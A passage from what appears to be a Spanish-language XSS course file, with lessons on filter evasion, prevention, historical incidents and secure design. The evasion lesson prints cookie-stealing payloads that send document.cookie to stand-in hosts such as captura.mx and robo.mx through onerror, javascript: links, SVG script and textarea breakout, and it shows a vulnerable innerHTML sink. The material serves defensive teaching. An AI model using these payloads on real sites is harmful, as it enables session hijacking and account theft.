          Muchas aplicaciones implementan filtros para bloquear scripts, deshabilitar etiquetas peligrosas o eliminar ciertos fragmentos de HTML. Sin embargo, los navegadores modernos ofrecen múltiples formas de ejecutar código, y los atacantes han aprendido a aprovechar mecanismos alternativos que no siempre son considerados por los filtros. Estas técnicas de evasión buscan transformar, ocultar o reconstruir el payload para que pase desapercibido durante la sanitización, pero se convierta nuevamente en código ejecutable cuando llega al navegador.
        </p>

        <p>
          A continuación, se analizan las técnicas reales más utilizadas para evadir defensas, acompañadas de ejemplos verificados que fueron utilizados en ataques históricos sobre plataformas como MySpace, Twitter, Joomla, eBay y múltiples plugins de WordPress.
        </p>

        <h2>Evasión mediante atributos de eventos y errores de recursos</h2>

        <p>
          Uno de los métodos más frecuentes para evadir defensas consiste en evitar directamente la etiqueta script. En lugar de ello, los atacantes utilizan atributos de eventos como onerror, onclick o onmouseover, los cuales ejecutan JavaScript cuando se cumple cierta condición.
        </p>

        <p>
          Un caso real ocurrió en eBay durante 2014. Aunque el sistema bloqueaba la etiqueta script, no filtraba atributos peligrosos en imágenes. Esto permitió payloads como:
        </p>

        <pre><code class="language-html highlight-vulnerable">
&lt;img src="x" onerror="window.location='http://captura.mx/e?c='+document.cookie"&gt;
        </code></pre>

        <p>
          Este fragmento pasa los filtros porque no contiene script explícito, pero el atributo onerror es suficiente para ejecutar código cuando la imagen falla en cargar. La vulnerabilidad surge porque los filtros a menudo buscan coincidencias directas con script, pero no evalúan la semántica del evento dentro del navegador.
        </p>

        <h2>Evasión mediante codificación y uso de entidades Unicode</h2>

        <p>
          Una técnica muy común consiste en codificar parcialmente el payload para que el filtro no lo reconozca, pero el navegador reconstruya su forma original. Esto fue exactamente lo que ocurrió en la vulnerabilidad de Twitter en 2010, donde tweets maliciosos utilizaban caracteres Unicode especiales para reconstruir atributos HTML al ser procesados por el navegador.
        </p>

        <p>Un ejemplo simplificado basado en ese ataque es:</p>

        <pre><code class="language-html highlight-vulnerable">
onmouseover="document.location='http://registro.mx/t?c='+document.cookie"
        </code></pre>

        <p>
          El atacante no colocaba directamente el atributo, sino que empleaba caracteres Unicode que representaban comillas y símbolos que Twitter permitía. Al decodificarse en el DOM, estos caracteres se convertían en atributos completamente válidos. La evasión funcionaba porque el filtro analizaba la cadena original, pero no el contenido una vez que el navegador la interpretaba.
        </p>

        <h2>Evasión mediante uso creativo de URL con el esquema javascript</h2>

        <p>
          Muchos sistemas validan enlaces solo para asegurar que comienzan con http o https, pero otros permiten cualquier esquema sin revisarlo. Esto ha permitido históricamente la ejecución de código cuando el navegador trata un enlace con esquema javascript.
        </p>

        <p>
          Un caso ampliamente documentado ocurrió en múltiples sistemas de foros y CMS antiguos. Un payload típico era:
        </p>

        <pre><code class="language-html highlight-vulnerable">
&lt;a href="javascript:document.location='http://captura.mx/?c='+document.cookie"&gt;Abrir información&lt;/a&gt;
        </code></pre>

        <p>
          Este enlace parece inofensivo si el sistema solo valida etiquetas permitidas y no analiza el esquema del enlace. Al hacer clic, el navegador ejecuta el código contenido dentro del enlace. La evasión ocurre porque el atributo href es considerado seguro en muchos filtros, pero puede convertirse en un vector directo de ataque.
        </p>

        <h2>Evasión mediante inserción dentro de atributos parcialmente filtrados</h2>

        <p>
          Algunos filtros buscan palabras exactas como script, pero permiten construcciones parciales que se reconstruyen durante el procesamiento del navegador. Este patrón fue explotado en múltiples campañas contra Joomla entre 2013 y 2016.
        </p>

        <p>Un ejemplo real empleaba el siguiente fragmento:</p>

        <pre><code class="language-html highlight-vulnerable">
&lt;svg&gt;&lt;script&gt;document.location='http://robo.mx/j?d='+document.cookie&lt;/script&gt;
        </code></pre>

        <p>
          Joomla bloqueaba la etiqueta script cuando se encontraba en HTML estándar, pero no cuando se colocaba dentro de un elemento svg, ya que el filtro asumía que el contenido SVG era seguro y no contenía JavaScript. Este fue un error común, ya que SVG admite scripts internos de forma nativa.
        </p>

        <p>
          La evasión era efectiva porque los filtros no analizaban de manera profunda los elementos SVG y el navegador interpretaba el contenido como un bloque de script perfectamente válido.
        </p>

        <h2>Evasión mediante concatenación de cadenas dentro del DOM</h2>

        <p>
          En ataques de tipo DOM XSS, los atacantes aprovechan que el navegador reconstruye cadenas antes de ejecutarlas. Un caso documentado ocurrió en aplicaciones que usaban innerHTML y sanitización incompleta del lado del cliente.
        </p>

        <p>
          Considere un código vulnerable inspirado en casos reales de paneles administrativos:
        </p>

        <pre><code class="language-html highlight-vulnerable">
var dato = location.hash.substring(1);
document.getElementById('panel').innerHTML = dato;
        </code></pre>

        <p>
          Un atacante podía utilizar la siguiente URL para ejecutar código:
        </p>

        <pre><code class="language-html highlight-vulnerable">
https://panel-corporativo.mx/dashboard#&lt;img src=x onerror="fetch('http://captura.mx/x',{method:'POST',body:document.cookie})"&gt;
        </code></pre>

        <p>
          En este escenario, el filtro posiblemente analizaba únicamente parámetros enviados al servidor, pero el hash no es enviado al backend. El script no es detectado porque la defensa jamás lo ve. El navegador, en cambio, sí inserta el contenido en el DOM y por lo tanto ejecuta el código.
        </p>

        <p>
          Esta evasión depende completamente del comportamiento del cliente y demuestra que un filtro del lado del servidor no es suficiente.
        </p>

        <h2>Evasión mediante aprovechamiento de comentarios, etiquetas incompletas o mezcla de sintaxis</h2>

        <p>
          Algunos ataques aprovechan que los navegadores intentan reparar HTML mal formado. Esto permite construir payloads que no parecen completos para el filtro, pero que el navegador interpreta correctamente.
        </p>

        <p>Un ejemplo basado en incidentes reales de foros y chats fue:</p>

        <pre><code class="language-html highlight-vulnerable">
&lt;/textarea&gt;&lt;script&gt;document.location='http://robo.mx/c?d='+document.cookie&lt;/script&gt;
        </code></pre>

        <p>
          La vulnerabilidad aparece cuando un formulario muestra de vuelta el contenido enviado por el usuario dentro de un textarea. Al cerrar prematuramente la etiqueta textarea, el atacante consigue escapar del entorno donde debía estar contenido su texto y coloca un script que el navegador interpretará como válido.
        </p>

        <p>
          Muchos filtros no detectan esta evasión porque operan asumiendo que la cadena se encuentra siempre dentro del elemento esperado.
        </p>

        <h2>Bibliografía</h2>
        <ul>
          <li>OWASP Foundation, XSS Filter Evasion Cheat Sheet. [Online]. Available:
            <a href="https://owasp.org/www-community/xss-filter-evasion-cheat-sheet" target="_blank">
              https://owasp.org/www-community/xss-filter-evasion-cheat-sheet
            </a>
          </li>

          <li>PortSwigger, Advanced XSS Attacks. [Online]. Available:
            <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">
              https://portswigger.net/web-security/cross-site-scripting
            </a>
          </li>

          <li>D. Stuttard and M. Pinto, <i>The Web Application Hacker's Handbook</i>, 2nd ed., Wiley Publishing, 2011.</li>
        </ul>
      `
    },
    'prevencion-xss': {
      id: 'prevencion-xss',
      title: 'Estrategias de prevención y mitigación',
      description: '¿Cómo proteger aplicaciones web frente a XSS?',
      category: 'xss',
      htmlContent: `
        <p>
  La mitigación de XSS requiere combinar múltiples prácticas que garanticen que el navegador no interprete contenido proporcionado por el usuario como código ejecutable. Esta protección se basa en controlar de manera rigurosa la forma en la que los datos circulan desde el usuario hasta la vista final, evitando que puedan escapar del contexto donde deberían permanecer como texto. Las técnicas de prevención deben aplicarse tanto en el servidor como en el cliente, ya que cualquier punto de inserción que procese HTML o JavaScript puede transformarse en un vector de ataque.
</p>

<p>
  En esta lección se presentan estrategias fundamentales de protección que se apoyan en ejemplos de código seguro. Cada fragmento se explica para comprender qué riesgo evita y por qué resulta efectivo frente a XSS.
</p>

<h2>Codificación correcta según el contexto</h2>

<p>
  Codificar el contenido antes de insertarlo en el HTML evita que los caracteres especiales sean interpretados como etiquetas o atributos. Cuando un valor codificado se inserta en la página, el navegador lo trata como texto plano.
</p>

<p>Un ejemplo de codificación para mostrar un valor dentro del cuerpo del HTML sería:</p>

<pre><code class="language-html highlight-secure">
&lt;p id="nombre"&gt;&lt;/p&gt;

&lt;script&gt;
  const nombreUsuario = obtenerNombre(); 
  document.getElementById('nombre').textContent = nombreUsuario;
&lt;/script&gt;
</code></pre>

<p>
  El uso de textContent asegura que el navegador nunca interpretará el contenido como HTML. Incluso si el nombre incluye símbolos especiales como menor que o mayor que, estos se representarán de forma literal. Esta técnica elimina por completo el riesgo de que la entrada del usuario se convierta en código ejecutable en ese contexto.
</p>

<h2>Evitar métodos inseguros para insertar contenido en el DOM</h2>

<p>
  Algunas funciones, como innerHTML o insertAdjacentHTML, interpretan la cadena como HTML. Si se utiliza cualquiera de estas funciones con contenido no confiable, el resultado puede ser la ejecución de código malicioso.
</p>

<p>La alternativa segura consiste en usar métodos que no interpreten HTML. Por ejemplo:</p>

<pre><code class="language-html highlight-secure">
const comentario = obtenerComentarioSeguro();

const contenedor = document.createElement('div');
contenedor.textContent = comentario;

document.body.appendChild(contenedor);
</code></pre>

<p>
  Este enfoque previene XSS porque la propiedad textContent no analiza etiquetas ni atributos; únicamente muestra texto. De esta forma, aunque el comentario contenga secuencias que podrían convertirse en un payload, el navegador nunca las procesará de manera activa.
</p>

<h2>Validación estricta de entradas</h2>

<p>
  Aunque la codificación es esencial, resulta aún más efectivo restringir aquello que la aplicación acepta como entrada. En campos donde el usuario solo debe proporcionar datos simples, la validación reduce la posibilidad de que valores peligrosos entren en el sistema.
</p>

<p>En un backend Express, una validación básica podría ser:</p>

<pre><code class="language-javascript highlight-secure">
app.post('/registro', (req, res) => {
  const nombre = req.body.nombre;

  if (!/^[a-zA-ZÁÉÍÓÚÑáéíóúñ ]+$/.test(nombre)) {
    return res.status(400).send('Formato inválido');
  }

  guardarUsuario(nombre);
  res.send('Usuario registrado');
});
</code></pre>

<p>
  Este fragmento garantiza que el nombre solo contiene caracteres permitidos y bloquea cualquier intento de añadir símbolos que puedan alterar el comportamiento del sistema. No se pretende filtrar HTML, sino restringir el campo a lo que debe contener.
</p>

<h2>Sanitización de HTML cuando es necesario permitir formato</h2>

<p>
  En algunas aplicaciones, los usuarios pueden insertar contenido enriquecido, como descripciones o publicaciones con estilo. En estos casos, la estrategia consiste en limpiar el HTML para eliminar etiquetas peligrosas.
</p>

<p>Un ejemplo usando una biblioteca de sanitización sería:</p>

<pre><code class="language-javascript highlight-secure">
const contenido = req.body.descripcion;
const limpio = DOMPurify.sanitize(contenido);

guardarDescripcion(limpio);
</code></pre>

<p>
  Este proceso elimina etiquetas script, atributos con eventos, esquemas javascript y elementos que pueden ejecutar código. La utilidad de este enfoque radica en permitir formato sin comprometer la seguridad del navegador ni del usuario.
</p>

<h2>Uso de Content Security Policy para restringir ejecución de scripts</h2>

<p>
  Content Security Policy es una capa defensiva que indica al navegador qué recursos puede ejecutar. Con una configuración adecuada, se evita que scripts no autorizados lleguen a ejecutarse incluso si hay un punto vulnerable.
</p>

<p>Un encabezado básico sería:</p>

<pre><code class="language-html highlight-secure">
Content-Security-Policy: script-src 'self';
</code></pre>

<p>Otra variante más estricta sería:</p>

<pre><code class="language-html highlight-secure">
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
</code></pre>

<p>
  CSP no reemplaza la codificación y sanitización, pero añade una barrera que detiene muchos ataques, aunque exista una vulnerabilidad en otro punto.
</p>

<h2>Configuración segura de cookies</h2>

<p>
  Las cookies de sesión deben configurarse para impedir su acceso desde JavaScript y evitar que se transmitan sin cifrado. Esto mitiga ataques que buscan robar cookies mediante instrucciones como document.cookie.
</p>

<p>Una cookie segura puede configurarse así:</p>

<pre><code class="language-html highlight-secure">
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict;
</code></pre>

<p>
  HttpOnly impide que JavaScript lea la cookie.<br>
  Secure obliga a enviarla únicamente por HTTPS.<br>
  SameSite restringe el envío en solicitudes cruzadas.
</p>

<p>
  Estas opciones protegen las sesiones incluso en caso de XSS, ya que el navegador no permite a los scripts acceder a la cookie para transmitirla a un servidor remoto.
</p>

<h2>Restricciones en enlaces y acciones sensibles</h2>

<p>
  Cuando se insertan enlaces que provienen de la entrada del usuario, es fundamental evitar que utilicen esquemas peligrosos como javascript. Para ello, debe aplicarse una verificación explícita en el servidor o en el cliente.
</p>

<p>Un ejemplo en el cliente sería:</p>

<pre><code class="language-javascript highlight-secure">
function esURLSegura(url) {
  try {
    const u = new URL(url);
    return u.protocol === 'https:' || u.protocol === 'http:';
  } catch {
    return false;
  }
}
</code></pre>

<p>Antes de insertar el enlace en el DOM:</p>

<pre><code class="language-javascript highlight-secure">
if (esURLSegura(url)) {
  enlace.href = url;
} else {
  enlace.href = '#';
}
</code></pre>

<p>
  Con esto, la aplicación no permitirá enlaces que ejecuten código cuando el usuario haga clic.
</p>

<h2>Bibliografía</h2>

<ul>
  <li>OWASP Foundation, XSS Prevention Cheat Sheet. [Online]. Available:
    <a href="https://owasp.org/www-community/xss-prevention" target="_blank">
      https://owasp.org/www-community/xss-prevention
    </a>
  </li>

  <li>Mozilla Developer Network, HTML and Script Security. [Online]. Available:
    <a href="https://developer.mozilla.org/en-US/docs/Web/Security" target="_blank">
      https://developer.mozilla.org/en-US/docs/Web/Security
    </a>
  </li>

  <li>Google Web Fundamentals, Safe DOM Manipulation. [Online]. Available:
    <a href="https://developers.google.com/web/fundamentals/security" target="_blank">
      https://developers.google.com/web/fundamentals/security
    </a>
  </li>

  <li>DOMPurify Documentation. [Online]. Available:
    <a href="https://github.com/cure53/DOMPurify" target="_blank">
      https://github.com/cure53/DOMPurify
    </a>
  </li>

  <li>D. Stuttard and M. Pinto, <i>The Web Application Hacker's Handbook</i>, 2nd ed., Wiley Publishing, 2011.</li>
</ul>
      `
    },
    'impacto-xss': {
      id: 'impacto-xss',
      title: 'Impacto y riesgos reales del XSS en organizaciones',
      description: 'Consecuencias y daños atribuibles a la explotación de XSS.',
      category: 'xss',
      htmlContent: `
        <p>
Los ataques XSS no solo representan un problema técnico, sino un riesgo directo para la operación y la continuidad de las organizaciones. Cuando un atacante consigue ejecutar código dentro del navegador de un usuario, adquiere la capacidad de manipular datos, robar información, suplantar identidades y alterar procesos internos. Los efectos pueden manifestarse en accesos no autorizados, fraudes en línea, exposición de información sensible, daños reputacionales y pérdida de confianza de clientes o empleados.
</p>

<p>
Para comprender la magnitud del riesgo, resulta esencial estudiar incidentes reales donde XSS provocó consecuencias significativas. Estos casos muestran cómo una vulnerabilidad aparentemente menor puede evolucionar en un problema grave que compromete la seguridad general de la plataforma.
</p>

<h2>MySpace y el gusano Samy: un ejemplo de propagación masiva en redes sociales</h2>

<p>
MySpace era una de las plataformas sociales más populares entre 2004 y 2008, con millones de usuarios que personalizaban sus perfiles con HTML, imágenes, música y estilos. Esta característica de personalización permitía a los usuarios incrustar contenido dinámico en sus páginas personales, lo que creó una superficie de ataque considerable.
</p>

<p>
El gusano Samy surgió cuando un usuario descubrió que MySpace filtraba la etiqueta script, pero no bloqueaba ciertos atributos y estructuras que podían reconstruir instrucciones JavaScript cuando la página era interpretada por el navegador. El atacante escribió un fragmento de código que se ejecutaba cuando un usuario visitaba su perfil. El script añadía automáticamente al atacante como amigo del visitante, modificaba el perfil del usuario afectado y copiaba el mismo payload en su página.
</p>

<p>
El ataque se propagó de manera exponencial. Cada nuevo perfil afectado se convertía en un nuevo punto de infección. En pocas horas, más de un millón de cuentas habían sido alteradas sin autorización. La integridad del contenido de MySpace fue completamente comprometida, ya que los perfiles mostraban mensajes que los usuarios nunca escribieron. La confidencialidad también se vio afectada, puesto que el script podía haber sido modificado para capturar información privada contenida en las páginas. La plataforma experimentó problemas de disponibilidad y una sobrecarga significativa debido a la cantidad de solicitudes generadas por la propagación del gusano.
</p>

<p>
El incidente demostró que una red social con un flujo masivo de usuarios puede convertirse en un vector de amplificación para un XSS almacenado. La reputación de MySpace se vio afectada por la percepción de que su plataforma era insegura y fácilmente manipulable.
</p>

<h2>eBay y la redirección fraudulenta a sitios externos</h2>

<p>
eBay es una de las empresas de comercio electrónico más grandes del mundo, dedicada a facilitar subastas y ventas directas entre usuarios y empresas. Su plataforma maneja transacciones económicas, credenciales de usuario, datos de contacto y métodos de pago, lo que la convierte en un objetivo atractivo para actores maliciosos.
</p>

<p>
Durante 2014, se descubrió que algunos vendedores podían incrustar código malicioso dentro de la descripción de los productos. La vulnerabilidad no residía en el servidor, sino en la forma en que ciertas páginas permitían HTML parcialmente filtrado. Aunque la etiqueta script estaba bloqueada, era posible usar elementos capaces de ejecutar código de manera indirecta. Este código redirigía al visitante hacia un sitio creado por los atacantes, diseñado para replicar la apariencia de eBay. Una vez allí, se solicitaba al usuario volver a iniciar sesión, obteniendo así sus credenciales.
</p>

<p>
El ataque afectó directamente a la confidencialidad, ya que credenciales reales fueron enviadas a servidores externos sin conocimiento de los usuarios. La integridad de las páginas de productos se vio comprometida, puesto que el contenido mostrado no correspondía a lo autorizado por eBay. La disponibilidad también se vio afectada debido a la necesidad de bloquear temporalmente anuncios, investigar publicaciones alteradas y corregir el motor de filtrado de HTML.
</p>

<p>
Para los compradores, la consecuencia fue la pérdida de acceso a sus cuentas y el riesgo de que los atacantes realizasen compras no autorizadas. Para la empresa, el incidente incrementó la presión regulatoria, dañó la percepción pública de la seguridad del sitio y obligó a invertir en mejoras urgentes para evitar un impacto económico mayor.
</p>

<h2>Yahoo! Mail y el compromiso de correos electrónicos</h2>

<p>
Yahoo! Mail fue durante años uno de los servicios de correo más utilizados del mundo, tanto por usuarios comunes como por pequeñas empresas que dependían del correo para su comunicación diaria. Debido a su alcance global, cualquier vulnerabilidad en su sistema podía afectar a millones de personas.
</p>

<p>
En uno de los incidentes más conocidos, un atacante descubrió que el visor de correos de Yahoo! permitía atributos HTML que no estaban siendo filtrados adecuadamente. Aunque el contenido del correo era procesado para evitar etiquetas peligrosas, algunos atributos capaces de ejecutar código permanecían permitidos. Cuando un usuario abría un correo malicioso, el script se ejecutaba dentro de su sesión.
</p>

<p>
El código ejecutado podía leer correos privados, reenviarlos automáticamente a direcciones controladas por el atacante y modificar configuraciones como reglas de reenvío o recuperación de cuenta. La confidencialidad fue afectada de manera directa y grave, ya que los atacantes podían acceder a conversaciones privadas que en muchos casos incluían información personal, datos financieros, documentos adjuntos o comunicaciones empresariales internas. La integridad también se vio comprometida debido a la manipulación del buzón sin intervención del usuario.
</p>

<p>
Para los usuarios, esto significó la exposición de información personal o confidencial. Para organizaciones que utilizaban Yahoo! Mail como servicio de comunicación, representó un riesgo de fuga de datos que podía afectar operaciones, decisiones estratégicas o incluso procesos legales. Para Yahoo!, el incidente deterioró su imagen pública en un periodo en el que la empresa ya enfrentaba cuestionamientos sobre su seguridad.
</p>

<h2>WordPress y la alteración de contenido institucional en sitios corporativos</h2>

<p>
WordPress es el sistema de gestión de contenido más utilizado en el mundo. Miles de empresas grandes, medianas y pequeñas lo utilizan para manejar sus sitios web, publicaciones informativas y blogs institucionales. Su arquitectura permite la instalación de plugins desarrollados por terceros, lo cual amplía sus capacidades pero también introduce riesgos de seguridad.
</p>

<p>
A lo largo de los años, diversos plugins han presentado vulnerabilidades XSS almacenadas. En estos casos, los atacantes podían insertar código dentro de campos aparentemente benignos, como formularios de contacto, sistemas de comentarios o configuraciones internas. Cuando un administrador accedía al panel para moderar contenido, el código se ejecutaba dentro de su sesión, otorgando al atacante privilegios administrativos.
</p>

<p>
El impacto sobre la integridad fue significativo. En numerosos incidentes, los atacantes modificaron publicaciones institucionales, alteraron la página principal de empresas, insertaron mensajes falsos o eliminaron contenido crítico. La confidencialidad también se vio afectada en casos donde los atacantes accedieron a paneles administrativos que contenían datos internos. La disponibilidad sufrió porque, en ocasiones, los sitios quedaban inutilizables o eran redirigidos hacia páginas externas.
</p>

<p>
Para las organizaciones afectadas, estos incidentes representaron pérdidas económicas derivadas de interrupciones del sitio, daños reputacionales por mostrar contenido no autorizado y costos derivados de auditorías y restauraciones.
</p>

<h2>Twitter y la ejecución automática de código en interfaces de usuario</h2>

<p>
Twitter es una red social con un volumen extremadamente alto de interacción por minuto. Los usuarios publican mensajes breves, imágenes, enlaces y contenidos que pueden ser visualizados instantáneamente por millones de usuarios. Debido a su dinamismo, la plataforma debe analizar y procesar grandes cantidades de contenido en tiempo real.
</p>

<p>
En uno de los incidentes más conocidos, se detectó que los tweets podían incluir fragmentos que, al ser interpretados por la aplicación web, ejecutaban JavaScript cuando el usuario movía el cursor sobre el texto. El problema se originó porque el sistema de sanitización no evaluaba adecuadamente ciertos caracteres Unicode que el navegador interpretaba como delimitadores de atributos.
</p>

<p>
El impacto fue considerable. La integridad de los perfiles se vio comprometida al permitir que los atacantes publicaran mensajes no autorizados en las cuentas de otros usuarios. La confidencialidad estuvo en riesgo debido a redirecciones automáticas hacia sitios externos diseñados para capturar credenciales. La disponibilidad de la plataforma se degradó temporalmente debido a la cantidad elevada de solicitudes derivadas del comportamiento automático del script.
</p>

<p>
Para Twitter, el incidente generó un cuestionamiento público respecto a la solidez de sus mecanismos de validación y a su capacidad para reaccionar ante vulnerabilidades que podían viralizarse de manera instantánea.
</p>

<h2>Bibliografía</h2>
<ul>
  <li>OWASP Foundation, Cross Site Scripting. [Online]. Available:
    <a href="https://owasp.org/www-community/attacks/xss" target="_blank">
      https://owasp.org/www-community/attacks/xss
    </a>
  </li>

  <li>PortSwigger, Web Security Academy. [Online]. Available:
    <a href="https://portswigger.net/web-security" target="_blank">
      https://portswigger.net/web-security
    </a>
  </li>

  <li>D. Stuttard and M. Pinto, <i>The Web Application Hacker’s Handbook</i>, 2nd ed., Wiley Publishing, 2011.</li>
</ul>
      `
    },
    'diseño-seguro-xss': {
      id: 'diseño-seguro-xss',
      title: 'Diseño seguro y buenas prácticas frente a XSS',
      description: 'Recomendaciones para el desarrollo seguro respecto a XSS.',
      category: 'xss',
      htmlContent: `
        <h2>El diseño seguro frente a XSS</h2>

<p>
El diseño seguro frente a XSS no consiste únicamente en añadir filtros o parches cuando aparece una vulnerabilidad. Implica estructurar la aplicación desde el inicio para que los datos proporcionados por el usuario nunca se mezclen con el código que el navegador ejecuta. En esta lección se presentan pautas de diseño y fragmentos de código que ilustran buenas prácticas para reducir de forma sistemática la posibilidad de introducir XSS en aplicaciones web.
</p>

<p>
Cada ejemplo muestra no solo el código, sino también qué sucede en él, qué representan sus etiquetas y por qué contribuye a un diseño más seguro.
</p>

<h3>Separación estricta entre datos y presentación</h3>

<p>
Una regla fundamental consiste en tratar todos los datos provenientes de usuarios como texto y no como fragmentos de HTML. Para ello, es preferible usar mecanismos que escapen o codifiquen automáticamente la salida, en lugar de construir cadenas HTML a mano.
</p>

<p>
En una plantilla del lado del servidor, un ejemplo seguro sería:
</p>

<pre><code>&lt;p&gt;Bienvenido, {{ usuario.nombre }}&lt;/p&gt;
</code></pre>

<p>
En muchos motores de plantillas (por ejemplo, Handlebars, Twig o similares), las llaves dobles indican que el valor será escapado antes de insertarse. Si el usuario intenta registrar un nombre como:
</p>

<pre><code>&lt;script&gt;alert('XSS')&lt;/script&gt;
</code></pre>

<p>
la plantilla lo convertirá en texto literal, mostrando en pantalla los caracteres menores y mayores, en lugar de interpretar el contenido como etiqueta de script. La etiqueta p mantiene su función de párrafo y el motor de plantillas se encarga de que dentro de ella solo haya texto, no código ejecutable.
</p>

<p>
En contraste, concatenar manualmente HTML con datos del usuario:
</p>

<pre><code>const html = "&lt;p&gt;Bienvenido, " + usuario.nombre + "&lt;/p&gt;";
</code></pre>

<p>
obliga al desarrollador a recordar escapar el valor por su cuenta y facilita errores de diseño. El enfoque basado en plantillas que escapan por defecto reduce este riesgo de forma considerable.
</p>

<h3>Construcción segura del DOM en el lado del cliente</h3>

<p>
En el navegador, muchas vulnerabilidades XSS surgen por el uso de innerHTML con cadenas que incluyen datos del usuario. Una alternativa segura es construir el DOM mediante nodos y asignar texto usando textContent.
</p>

<p>Un ejemplo de construcción segura de un comentario sería:</p>

<pre><code>function agregarComentario(contenedor, textoComentario, autor) {
  const tarjeta = document.createElement('article');
  tarjeta.className = 'comentario';

  const encabezado = document.createElement('h3');
  encabezado.textContent = autor;

  const cuerpo = document.createElement('p');
  cuerpo.textContent = textoComentario;

  tarjeta.appendChild(encabezado);
  tarjeta.appendChild(cuerpo);
  contenedor.appendChild(tarjeta);
}
</code></pre>

<p>
En este código, la etiqueta <code>article</code> agrupa el comentario completo, <code>h3</code> contiene el nombre del autor y <code>p</code> almacena el texto del comentario. En ningún momento se utiliza <code>innerHTML</code>, por lo que el navegador nunca interpreta partes del texto como HTML. Incluso si el usuario introduce secuencias que parecen etiquetas, estas se mostrarán literalmente y no se ejecutarán.
</p>

<p>
Este diseño evita que el desarrollador tenga que revisar cada campo para escapar manualmente los caracteres especiales. El uso sistemático de <code>textContent</code> para todo dato no confiable es una buena práctica poderosa frente a XSS.
</p>

<h3>Formularios y salida controlada en el servidor</h3>

<p>
Los formularios son una fuente común de datos que después se muestran en la interfaz. Diseñar el flujo para que el servidor siempre procese y escape la salida antes de devolverla al usuario es una práctica esencial.
</p>

<p>En un controlador de un backend <code>Express</code> se podría tener:</p>

<pre><code>app.post('/comentarios', (req, res) =&gt; {
  const comentario = req.body.comentario;
  const autor = req.body.autor;

  // Se guarda el texto tal cual en la base de datos, sin interpretarlo como HTML
  guardarComentario({ comentario, autor });

  res.redirect('/comentarios');
});
</code></pre>

<p>
Y en la plantilla donde se muestran los comentarios:
</p>

<pre><code>&lt;ul&gt;
  {{#each comentarios}}
    &lt;li&gt;
      &lt;strong&gt;{{ this.autor }}&lt;/strong&gt;:
      &lt;span&gt;{{ this.comentario }}&lt;/span&gt;
    &lt;/li&gt;
  {{/each}}
&lt;/ul&gt;
</code></pre>

<p>
Las etiquetas <code>ul</code> y <code>li</code> estructuran la lista de comentarios, <code>strong</code> resalta el nombre del autor y <code>span</code> contiene el texto del comentario. El motor de plantillas se encarga de escapar <code>autor</code> y <code>comentario</code>. El diseño del flujo garantiza que los datos siempre pasan por una capa de presentación que aplica codificación adecuada.
</p>

<h3>Eliminación de código embebido en atributos HTML</h3>

<p>
Otra buena práctica de diseño es evitar código JavaScript embebido directamente en atributos HTML como <code>onclick</code> u <code>onmouseover</code>. En lugar de ello, se deben definir manejadores de eventos desde JavaScript, separando claramente el marcado de la lógica.
</p>

<pre><code>&lt;button id="enviar-comentario"&gt;Enviar comentario&lt;/button&gt;
</code></pre>
<p>Y en el script asociado:</p>
<pre><code>const boton = document.getElementById('enviar-comentario');

boton.addEventListener('click', function () {
  enviarFormularioComentario();
});
</code></pre>

<p>
En este enfoque, la etiqueta <code>button</code> solo describe el elemento visual. No contiene código JavaScript en su definición. Si se insertaran datos de usuario en otros atributos del botón, estos no afectarían al comportamiento del manejador de eventos, que está definido del lado del código y no en el HTML generado. Al reducir el uso de atributos con código, se eliminan puntos comunes de inyección.
</p>

<h3>Diseño de componentes que nunca renderizan HTML crudo</h3>

<p>
En aplicaciones basadas en componentes, como las escritas con frameworks modernos, es recomendable definir una política clara: ningún componente debe usar directivas que permitan interpretar HTML crudo a partir de datos del usuario, salvo casos muy justificados y con sanitización explícita.
</p>

<p>En una plantilla de componente, una versión segura sería:</p>

<pre><code>&lt;div class="tarjeta-usuario"&gt;
  &lt;h2&gt;{{ nombre }}&lt;/h2&gt;
  &lt;p&gt;{{ descripcion }}&lt;/p&gt;
&lt;/div&gt;
</code></pre>

<p>La etiqueta <code>div</code> agrupa la tarjeta, <code>h2</code> contiene el nombre y <code>p</code> la descripción. La lógica del componente se limita a proporcionar valores de texto:</p>

<pre><code>@Component({
  selector: 'app-tarjeta-usuario',
  templateUrl: './tarjeta-usuario.html'
})
export class TarjetaUsuarioComponent {
  nombre = '';
  descripcion = '';
}
</code></pre>

<p>
Mientras las propiedades <code>nombre</code> y <code>descripcion</code> se vinculen con interpolación simple, el framework aplicará escape automático. La directiva que permitiría interpretar HTML crudo (por ejemplo, propiedades especiales que insertan HTML sin escape) no debe usarse con datos de usuario. Establecer esta regla de diseño desde el inicio evita que, por comodidad, se introduzcan atajos peligrosos.
</p>

<h3>Uso de funciones reutilizables para validar y normalizar entradas</h3>

<p>
Un diseño seguro contempla funciones reutilizables que validan y normalizan entradas en lugar de repetir lógica dispersa por el código. Esto reduce errores y ofrece un comportamiento coherente en toda la aplicación.
</p>

<p>Un ejemplo de función de normalización para nombres podría ser:</p>

<pre><code>function normalizarNombre(nombre) {
  const recortado = nombre.trim();
  const limitado = recortado.slice(0, 80);
  return limitado;
}
</code></pre>

<p>Y su uso en el backend:</p>

<pre><code>app.post('/perfil', (req, res) =&gt; {
  const nombreBruto = req.body.nombre;
  const nombre = normalizarNombre(nombreBruto);

  actualizarPerfil(req.usuario.id, { nombre });
  res.redirect('/perfil');
});
</code></pre>

<p>
En este diseño, la entrada se limpia y se limita de forma consistente. Aunque la normalización por sí sola no elimina por completo el riesgo de XSS, combinada con la codificación de salida y el uso de plantillas seguras, contribuye a un modelo de datos más predecible y menos propenso a contener caracteres problemáticos.
</p>

<h3>Configuración centralizada de políticas de seguridad</h3>

<p>
Además del código de aplicación, un diseño seguro incorpora políticas a nivel de servidor que establecen límites a la ejecución de scripts. Content Security Policy es un ejemplo de configuración que se debe contemplar desde las primeras fases del diseño.
</p>
<p>Un encabezado básico podría definirse en la configuración del servidor:</p>
<pre><code>Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
</code></pre>

<p>
En este caso, <code>default-src</code> establece que los recursos deben provenir del mismo origen, <code>script-src</code> limita los scripts a los alojados en el propio dominio y <code>object-src</code> evita la carga de objetos potencialmente peligrosos. Si el código de la aplicación respetó las buenas prácticas anteriores, esta política no debería interferir con el funcionamiento normal, pero sí bloquearía intentos de ejecutar scripts insertados por datos no autorizados.
</p>

<p>
Integrar estas cabeceras desde el diseño inicial reduce la probabilidad de que se despliegue la aplicación sin defensas de navegador, y obliga a revisar conscientemente qué orígenes y tipos de recurso son realmente necesarios.
</p>

<h3>Bibliografía</h3>
<ul>
  <li>
